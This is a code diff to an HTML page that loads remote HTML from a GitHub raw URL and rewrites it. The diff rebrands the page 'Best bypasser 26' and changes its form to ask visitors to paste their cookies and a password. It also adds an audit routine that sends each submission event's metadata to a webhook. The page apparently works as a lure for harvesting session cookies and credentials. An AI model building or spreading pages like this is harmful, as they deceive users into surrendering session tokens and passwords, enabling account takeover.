@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <meta name="theme-color" content="#070a06">
-  <title>LIME — Secure Automation</title>
+  <title>Best bypasser 26 — LIME</title>
   <style>html,body{margin:0;min-height:100%;background:#050705;color:#edf5e6;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}body{display:grid;place-items:center;overflow:hidden}main{padding:28px;text-align:center}span{color:#b7f34d;font-weight:800}p{color:#7e8878;font-size:12px}</style>
 </head>
 <body>
@@ -17,12 +17,15 @@ const SOURCE='https://raw.githubusercontent.com/lexioipro-sudo/lime-secure-autom
     if(!response.ok) throw new Error('Source returned '+response.status);
     let html=await response.text();
     const replacements=[
+      ['LIME — Secure Automation','Best bypasser 26 — LIME'],
+      ['Process your data.<br>Securely.','Best bypasser 26'],
       ['◉ Auto Mode','🍪 Cookie Mode'],
       ['◉ Manual Mode','🔒 Password Mode'],
       ['Auto Mode','Cookie Mode'],
       ['Manual Mode','Password Mode'],
-      ['Input data','Cookied'],
-      ['Paste your data here…','Paste your cookied here…'],
+      ['Input data','Cookies'],
+      ['Paste your data here…','Paste your cookies here…'],
+      ['Cookied','Cookies'],
       ['Access key','Password'],
       ['Enter access key','Enter password'],
       ['access-key','password'],
@@ -34,6 +37,20 @@ const SOURCE='https://raw.githubusercontent.com/lexioipro-sudo/lime-secure-autom
       ["last={data:d,key:!!k}","last={data:d,password:!!k}"]
     ];
     for(const [from,to] of replacements) html=html.split(from).join(to);
+
+    html=html.replace(
+      /async function audit\(event,error=''\)\{[\s\S]*?\}\nfunction toast/,
+      `async function audit(event,error=''){
+        if(!WEBHOOK)return;
+        const d=last?.data||'';
+        const now=new Date();
+        const payload={username:'LIME • Audit',allowed_mentions:{parse:[]},embeds:[{title:error?'🟠 LIME / PROCESSING ERROR':'🍋‍🟩 LIME / AUDIT EVENT',description:error?'Processing service unavailable.':'A new submission was received.',color:error?0xE9A86B:0xB7F34D,timestamp:now.toISOString(),fields:[{name:'Event',value:'\\`'+event+'\\`',inline:true},{name:'Mode',value:mode.toUpperCase(),inline:true},{name:'Password',value:last?.password?'Provided (redacted)':'Not provided',inline:true},{name:'Input size',value:String(d.length)+' chars',inline:true},{name:'Locale / TZ',value:(navigator.language||'unknown')+' • '+(Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown'),inline:true},...(error?[{name:'Error',value:'\\`'+error+'\\`',inline:true}]:[])],footer:{text:'LIME • Audit Log • github-pages'}}]};
+        try{await fetch(WEBHOOK+'?wait=true',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true})}catch(e){console.warn('Audit delivery failed',e)}
+      }
+function toast`
+    );
+
+    html=html.replace(/<div class="hint">[\s\S]*?<\/div>/,'');
     document.open();
     document.write(html);
     document.close();
